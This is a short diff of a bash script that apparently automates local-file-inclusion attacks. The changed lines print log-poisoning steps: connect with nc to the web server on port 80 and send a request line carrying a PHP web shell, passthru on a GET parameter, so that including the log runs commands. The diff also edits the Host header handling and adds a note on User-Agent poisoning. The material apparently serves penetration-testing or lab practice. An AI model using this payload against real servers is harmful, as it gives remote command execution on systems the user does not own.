@@ -274,8 +274,7 @@ for log in "${LOG_PATHS[@]}"; do
                 echo "         the PHP tags). Send it to the web service whose log you're"
                 echo "         reading - usually PORT 80, which may NOT be the LFI app's port:"
                 echo "         nc -nv ${POISON_HOST} 80"
-                echo "         GET /<?php passthru(\$_GET[\"${CMD_PARAM}\"]); ?>"
-                echo "         Host: ${POISON_HOST}"
+                echo "         GET /<?php passthru(\$_GET[\"${CMD_PARAM}\"]); ?> HTTP/1.1"
                 echo "         (User-Agent poisoning via 'curl -A' only lands if Apache LogFormat"
                 echo "          is 'combined'; the request-line method also works with 'common'.)"
                 ;;
